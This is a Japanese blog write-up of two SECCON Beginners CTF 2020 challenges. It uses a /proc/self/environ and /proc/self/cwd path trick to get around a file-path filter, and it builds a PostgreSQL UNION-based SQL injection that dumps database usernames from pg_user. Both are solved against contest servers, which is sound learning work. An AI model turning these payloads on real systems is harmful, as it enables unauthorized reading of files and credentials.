<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>SECCON Beginners CTF 2020解けた問題 writeup | terassyi</title>
    <meta name="description" content="ctf4bに参加しました．解けた問題をまとめます．">
    <meta name="generator" content="VuePress 1.4.0">
    <meta property="article:published_time" content="2020-05-24T00:00:00.000Z"><meta property="article:modified_time" content="2020-06-04T11:48:04.000Z"><meta property="og:site_name" content="terassyi"><meta property="og:title" content="SECCON Beginners CTF 2020解けた問題 writeup"><meta property="og:description" content="ctf4bに参加しました．解けた問題をまとめます．"><meta property="og:type" content="website"><meta property="og:url" content="/posts/2020/05/24/ctf4b.html"><meta name="twitter:title" content="SECCON Beginners CTF 2020解けた問題 writeup"><meta name="twitter:description" content="ctf4bに参加しました．解けた問題をまとめます．"><meta name="twitter:url" content="/posts/2020/05/24/ctf4b.html"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:label2" content="Filed under"><meta name="twitter:data2" content="ctf, ctf4b, seccon, pwn, web"><meta property="article:tag" content="ctf"><meta property="article:tag" content="ctf4b"><meta property="article:tag" content="seccon"><meta property="article:tag" content="pwn"><meta property="article:tag" content="web">
    <link rel="preload" href="/assets/css/0.styles.59c2fb62.css" as="style"><link rel="preload" href="/assets/js/app.f8942ceb.js" as="script"><link rel="preload" href="/assets/js/10.b0186384.js" as="script"><link rel="preload" href="/assets/js/5.9479a820.js" as="script"><link rel="prefetch" href="/assets/js/1.e8d6dc79.js"><link rel="prefetch" href="/assets/js/11.4ec12c96.js"><link rel="prefetch" href="/assets/js/12.f8afba66.js"><link rel="prefetch" href="/assets/js/13.d02e2fa8.js"><link rel="prefetch" href="/assets/js/14.ce2cd9e7.js"><link rel="prefetch" href="/assets/js/15.2be46745.js"><link rel="prefetch" href="/assets/js/16.bf085fee.js"><link rel="prefetch" href="/assets/js/17.1ed29426.js"><link rel="prefetch" href="/assets/js/18.bca0d097.js"><link rel="prefetch" href="/assets/js/19.d5820c36.js"><link rel="prefetch" href="/assets/js/20.285273ee.js"><link rel="prefetch" href="/assets/js/21.a1c766d9.js"><link rel="prefetch" href="/assets/js/22.6f7d0015.js"><link rel="prefetch" href="/assets/js/23.9e071e95.js"><link rel="prefetch" href="/assets/js/24.6897993a.js"><link rel="prefetch" href="/assets/js/25.48f9b2e1.js"><link rel="prefetch" href="/assets/js/26.28be21f3.js"><link rel="prefetch" href="/assets/js/27.b7b69ab9.js"><link rel="prefetch" href="/assets/js/28.de620153.js"><link rel="prefetch" href="/assets/js/29.7845fd2d.js"><link rel="prefetch" href="/assets/js/3.d7714460.js"><link rel="prefetch" href="/assets/js/30.9343b734.js"><link rel="prefetch" href="/assets/js/31.75bc9844.js"><link rel="prefetch" href="/assets/js/32.1ba68d96.js"><link rel="prefetch" href="/assets/js/33.9bb6be8d.js"><link rel="prefetch" href="/assets/js/4.8a2b0452.js"><link rel="prefetch" href="/assets/js/6.5a50f8e3.js"><link rel="prefetch" href="/assets/js/7.d5c2cb42.js"><link rel="prefetch" href="/assets/js/8.c19945a8.js"><link rel="prefetch" href="/assets/js/9.60a12ce3.js">
    <link rel="stylesheet" href="/assets/css/0.styles.59c2fb62.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div id="vuepress-theme-meteorlxy"><header class="header" style="background-size:cover;background-repeat:no-repeat;background-position:center;background-attachment:scroll;background-image:url(/img/bg.jpg);" data-v-7a046aea><div data-v-e4145d0a data-v-7a046aea><nav class="navbar" data-v-e4145d0a><div class="container" data-v-e4145d0a><a href="/" class="router-link-active" data-v-e4145d0a><span class="navbar-site-name" data-v-e4145d0a>
          terassyi
        </span></a> <div class="navbar-toggler" data-v-e4145d0a><svg class="icon" style="font-size:1.2em;" data-v-e4145d0a data-v-e4145d0a><title data-v-e4145d0a data-v-e4145d0a>menu</title><use xlink:href="#icon-menu" data-v-e4145d0a data-v-e4145d0a></use></svg></div> <div class="navbar-links" data-v-e4145d0a><a href="/" class="navbar-link" data-v-e4145d0a>
            Home
          </a><a href="/posts/" class="navbar-link router-link-active" data-v-e4145d0a>
            Posts
          </a><a href="/about/" class="navbar-link" data-v-e4145d0a>
            About
          </a></div></div></nav> <div class="navbar-holder" style="display:none;" data-v-e4145d0a></div></div> <div class="banner" data-v-98d6aa8c data-v-7a046aea data-v-7a046aea><div class="container" data-v-98d6aa8c><div class="center" data-v-98d6aa8c><h1 data-v-98d6aa8c data-v-7a046aea>
          SECCON Beginners CTF 2020解けた問題 writeup
        </h1></div></div></div></header> <div class="container clearfix show-aside" data-v-4dd605a1 data-v-4dd605a1><main class="main" data-v-4dd605a1><div class="post" data-v-4dd605a1 data-v-4dd605a1><section class="post-meta main-div" data-v-4e23451f><section class="post-date clearfix" data-v-4e23451f><span class="create-date" data-v-4e23451f>
      Created : 2020-05-24
    </span> <span class="update-date" data-v-4e23451f>
      Updated : 2020-06-04
    </span></section> <section class="post-links" data-v-4e23451f><a href="/posts/2020/05/08/container.html" class="post-link" data-v-4e23451f>
      Previous Post : 自作コンテナランタイムでつまずいてる話
    </a> <a href="/posts/2020/06/04/elementary-stack.html" class="post-link" data-v-4e23451f>
      Next Post : SECCON Beginners CTF 2020 Elementary stackを理解する
    </a></section></section> <article class="main-div"><div class="post-content content content__default"><p>こんにちは．福岡では緊急事態宣言は解除されましたが授業もアルバイト，ゼミもリモートのため相変わらず外出しない生活を送っています．</p> <h2 id="ctf4b"><a href="#ctf4b" class="header-anchor">#</a> ctf4b</h2> <p>ctf4bに大学の研究室のメンバーで参加してきました．昨年は全く手が出ませんでしたが今年は結構楽しくCTFができました．(解けたとは言ってない．)
得意分野と言える分野もないので雑食でいろいろな分野を覗いてました．
僕は<code>readme</code>,<code>beginner's stack</code>,<code>tweetstore</code>をときました．また，時間内にフラグは得られませんでしたが終了後に気づいた<code>unzip</code>も記載します．
(その他の問題も解けたら追記しようかな)
では，</p> <p><a href="https://www.seccon.jp/2019/seccon_beginners/seccon_beginners_ctf_2020_5_23_1400.html" target="_blank" rel="noopener noreferrer">https://www.seccon.jp/2019/seccon_beginners/seccon_beginners_ctf_2020_5_23_1400.html<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h3 id="追記"><a href="#追記" class="header-anchor">#</a> 追記</h3> <p>pwnの<a href="https://terassyi.net/posts/2020/06/04/elementary-stack.html" target="_blank" rel="noopener noreferrer">elementary stack<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>についてポストしました．</p> <h3 id="readme"><a href="#readme" class="header-anchor">#</a> readme</h3> <p>Miscの問題です．問題サーバで動いているコードが配布されます．</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> os
<span class="token keyword">assert</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">'/home/ctf/flag'</span><span class="token punctuation">)</span> <span class="token comment"># readme</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    path <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;File: &quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token string">&quot;[-] File not found&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token string">&quot;[-] Not a file&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'/'</span> <span class="token operator">!=</span> path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token string">&quot;[-] Use absolute path&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'ctf'</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token string">&quot;[-] Path not allowed&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token string">&quot;[-] Permission denied&quot;</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>ncコマンドでサーバに接続すると<code>File:</code>と出てきてパスを入力します．<code>/home/ctf/flag</code>を開くことができればフラグが得られそうです．
しかし．入力文字列にはいくつかの制限があります．</p> <ul><li>指定したパスが存在する</li> <li>指定したパスがファイルである</li> <li>指定したパスが絶対パスである</li> <li>指定されたパスに<code>ctf</code>という文字列が存在しない</li> <li>指定したファイルが開ける</li></ul> <p>条件は以上です．
<code>ctf</code>が許されないので<code>/home/ctf/flag</code>は当然の如く失敗します．
<strong>ctfという文字列を使用せずにどの様にしてパスを取得するか</strong>がポイントです．
現在のプロセスが動いているカレントディレクトリを取得することができれば良さげです．
そこで登場するのが<code>/proc</code>です．
<code>/proc</code>ファイルシステムは特殊なディレクトリでシステムの情報や動作しているプロセスの情報を取得することができます．
あるプロセスに関する情報が欲しい場合は<code>/proc/[pid]</code>を参照します．自身のプロセスの情報を得たい場合は<code>/proc/self</code>です．
<code>/proc</code>は面白いのでぜひいろいろ覗いてみてください．
さて，<code>/proc/self/cwd</code>がプロセス自身のカレントディレクトリへのシンボリックリンクとなっています．が，ここで<code>/proc/self/cwd</code>を入れてもファイルじゃないのでダメです．そこで，<code>/proc/self/environ</code>を入力してみます．すると環境変数がいっぱい出てきます．その中に<code>PWD=/home/ctf/server</code>が見つかりました．
このプロセスは<code>/home/ctf/server</code>で動いてそうですね．</p> <p>なので<code>/proc/self/cwd/../flag</code>と入力するとフラグを得ることができました．</p> <h3 id="tweetstore"><a href="#tweetstore" class="header-anchor">#</a> Tweetstore</h3> <p>WebのSQLインジェクションの問題です．Go言語で書かれたサーバのコードが配布されました．データベースにツイートが保存されています．<code>search word</code>に指定したワードに関連したツイートを<code>limit</code>で指定した数まで表示させることができます．
データベース関連のコードは以下の様になっていました．</p> <div class="language-go line-numbers-mode"><pre class="language-go"><code><span class="token keyword">func</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">var</span> err <span class="token builtin">error</span>
	dbname <span class="token operator">:=</span> <span class="token string">&quot;ctf&quot;</span>
	dbuser <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">&quot;FLAG&quot;</span><span class="token punctuation">)</span>
	dbpass <span class="token operator">:=</span> <span class="token string">&quot;password&quot;</span>
	connInfo <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">&quot;port=%d host=%s user=%s password=%s dbname=%s sslmode=disable&quot;</span><span class="token punctuation">,</span> <span class="token number">5432</span><span class="token punctuation">,</span> <span class="token string">&quot;db&quot;</span><span class="token punctuation">,</span> dbuser<span class="token punctuation">,</span> dbpass<span class="token punctuation">,</span> dbname<span class="token punctuation">)</span>
	db<span class="token punctuation">,</span> err <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">&quot;postgres&quot;</span><span class="token punctuation">,</span> connInfo<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>使用しているDBはpostgres sqlですね．
この関数でデータベースへの接続の処理を行っています．<code>dbuser</code>に環境変数からFLAGの値を読み出してそれをユーザー名としてログインしている様です．
なのでDBのユーザー名がわかればいいということになります．
では次はクエリを組み立てる部分．</p> <div class="language-go line-numbers-mode"><pre class="language-go"><code><span class="token keyword">type</span> Tweets <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	Url        <span class="token builtin">string</span>
	Text       <span class="token builtin">string</span>
	Tweeted_at time<span class="token punctuation">.</span>Time
<span class="token punctuation">}</span>
<span class="token keyword">func</span> <span class="token function">handler_index</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	tmpl<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFiles</span><span class="token punctuation">(</span>tmplPath <span class="token operator">+</span> <span class="token string">&quot;index.html&quot;</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">&quot;select url, text, tweeted_at from tweets&quot;</span>
	search<span class="token punctuation">,</span> ok <span class="token operator">:=</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;search&quot;</span><span class="token punctuation">]</span>
	<span class="token keyword">if</span> ok <span class="token punctuation">{</span>
		sql <span class="token operator">+=</span> <span class="token string">&quot; where text like '%&quot;</span> <span class="token operator">+</span> strings<span class="token punctuation">.</span><span class="token function">Replace</span><span class="token punctuation">(</span>search<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">&quot;'&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;\\'&quot;</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;%'&quot;</span>
	<span class="token punctuation">}</span>
	sql <span class="token operator">+=</span> <span class="token string">&quot; order by tweeted_at desc&quot;</span>
	limit<span class="token punctuation">,</span> ok <span class="token operator">:=</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;limit&quot;</span><span class="token punctuation">]</span>
	<span class="token keyword">if</span> ok <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>limit<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		sql <span class="token operator">+=</span> <span class="token string">&quot; limit &quot;</span> <span class="token operator">+</span> strings<span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span>limit<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">&quot;;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
	<span class="token punctuation">}</span>
	<span class="token comment">// select url, text, tweeted_at from tweets where text like ctf4b(decoded) order by tweeted_at desc limit 10--</span>
	<span class="token comment">// select schemaname, tablename, tableowner from pg_tables</span>
	<span class="token keyword">var</span> data <span class="token punctuation">[</span><span class="token punctuation">]</span>Tweets
	ctx<span class="token punctuation">,</span> cancel <span class="token operator">:=</span> context<span class="token punctuation">.</span><span class="token function">WithTimeout</span><span class="token punctuation">(</span>context<span class="token punctuation">.</span><span class="token function">Background</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">*</span>time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span>
	<span class="token keyword">defer</span> <span class="token function">cancel</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	rows<span class="token punctuation">,</span> err <span class="token operator">:=</span> db<span class="token punctuation">.</span><span class="token function">QueryContext</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> sql<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">{</span>
		http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">StatusText</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">for</span> rows<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">var</span> text <span class="token builtin">string</span>
		<span class="token keyword">var</span> url <span class="token builtin">string</span>
		<span class="token keyword">var</span> tweeted_at time<span class="token punctuation">.</span>Time
		err <span class="token operator">:=</span> rows<span class="token punctuation">.</span><span class="token function">Scan</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>url<span class="token punctuation">,</span> <span class="token operator">&amp;</span>text<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tweeted_at<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">StatusText</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
		data <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> Tweets<span class="token punctuation">{</span>url<span class="token punctuation">,</span> text<span class="token punctuation">,</span> tweeted_at<span class="token punctuation">}</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	tmpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br></div></div><p>こちらでクエリを組み立てています．<code>search word</code>として入力された値の中の<code>'</code>を<code>\'</code>として出力する様に処理されていて，<code>limit</code>として入力された値では<code>;</code>が入らない様になっています．</p> <p>試しに<code>seach word</code>に<code>'--</code>を入力してみると<code>Internal Server Error</code>を返しました．<code>500</code>を返す場所は二箇所ありますが，とりあえず単純なインジェクションではダメそうです．</p> <p>さて，Postgres SQLでユーザ情報を取得するにはどの様なクエリを投げれば良いでしょうか．ユーザに関する情報は<code>pg_user</code>というテーブルに保存されています．
<code>pg_user</code>の構造を見てみましょう．以下を参照ください．
<a href="https://www.postgresql.jp/document/8.0/html/view-pg-user.html" target="_blank" rel="noopener noreferrer">pg_user<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>
というわけでユーザ名は<code>usename</code>として参照できそうですね．</p> <p>ではインジェクションするクエリを組み立てます．</p> <div class="language-go line-numbers-mode"><pre class="language-go"><code><span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">&quot;select url, text, tweeted_at from tweets&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>この部分から，３つ列を取り出しており，<code>text</code>, <code>text</code>, 'timestamp'型のようです．というわけで<code>pg_user</code>から<code>usename</code>を含む何かしらの３つの列を取り出して結合すれば良さげです．
最初はlimitの後に<code>10 union select usename,usename,null from pg_user;</code>をつなげればいいと思っていましたが，limit句の後にunionはつなげられないらしく，つなげる場合，</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token punctuation">(</span><span class="token keyword">select</span> url<span class="token punctuation">,</span> <span class="token keyword">text</span><span class="token punctuation">,</span> tweeted_at <span class="token keyword">from</span> tweets <span class="token keyword">where</span> <span class="token keyword">text</span> <span class="token operator">like</span> <span class="token string">'%[:search word]%'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> tweeted_at <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token punctuation">(</span><span class="token keyword">select</span> usename<span class="token punctuation">,</span> usename<span class="token punctuation">,</span> <span class="token boolean">null</span> <span class="token keyword">from</span> pg_user<span class="token punctuation">)</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>みたいに()を付けないといけないらしく，無理そうだということでした．</p> <p>さてそれではどうするか，<code>limit</code>はダメそうなのでやはり<code>search word</code>でクエリを組み立てる必要がありそうです．
<code>'</code>が入らなそうなのでどうしようかと思っていましたが，<code>\'</code>になるだけなので実はいけるのではと思い手元にPostgre環境を立てて実行してみたところ実行できました．
というわけで実は<code>search word</code>でインジェクションのクエリが組み立てられそうです．というわけで次のようなクエリを組み立てました．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> url<span class="token punctuation">,</span> <span class="token keyword">text</span><span class="token punctuation">,</span> tweeted_at <span class="token keyword">from</span> tweets <span class="token keyword">where</span> <span class="token keyword">text</span> <span class="token operator">like</span> <span class="token string">'%hoge\' union select usename, usename, null from pg_user;-- %'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> tweeted_at <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">10</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>これは<code>;--</code>より後ろがコメントとして無視されるので実際に実行されるのは以下のようになります．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> url<span class="token punctuation">,</span> <span class="token keyword">text</span><span class="token punctuation">,</span> tweeted_at <span class="token keyword">from</span> tweets <span class="token keyword">where</span> <span class="token keyword">text</span> <span class="token operator">like</span> '<span class="token operator">%</span>hoge\' <span class="token keyword">union</span> <span class="token keyword">select</span> usename<span class="token punctuation">,</span> usename<span class="token punctuation">,</span> <span class="token boolean">null</span> <span class="token keyword">from</span> pg_user<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>これで行けると思いましたが，<code>500</code>になってしまいました．
手元の環境で実行できているのに<code>500</code>になるので他の原因がありそうです．
そういえば<code>500</code>になるのはもう一箇所ありました．
ここですね．</p> <div class="language-go line-numbers-mode"><pre class="language-go"><code>err <span class="token operator">:=</span> rows<span class="token punctuation">.</span><span class="token function">Scan</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>url<span class="token punctuation">,</span> <span class="token operator">&amp;</span>text<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tweeted_at<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">StatusText</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>どうしてエラーになるのかと眺めていたところ，<code>rows.Scan()</code>はクエリの実行結果に<code>null</code>が入っているとエラーを返すことに気付きました．
<a href="https://qiita.com/Neetless/items/cce3d256a3b879d6f9b3" target="_blank" rel="noopener noreferrer">こちら<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>を参照してください．
つまり，先ほどのクエリでは<code>null</code>を返しているのでダメということですね．
というわけで最終的に組み立てたのは以下のようなクエリです．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> url<span class="token punctuation">,</span> <span class="token keyword">text</span><span class="token punctuation">,</span> tweeted_at <span class="token keyword">from</span> tweets <span class="token keyword">where</span> <span class="token keyword">text</span> <span class="token operator">like</span> '<span class="token operator">%</span>hoge\' <span class="token keyword">union</span> <span class="token keyword">select</span> usename<span class="token punctuation">,</span> usename<span class="token punctuation">,</span> <span class="token keyword">current_timestamp</span> <span class="token keyword">from</span> pg_user<span class="token punctuation">;</span>
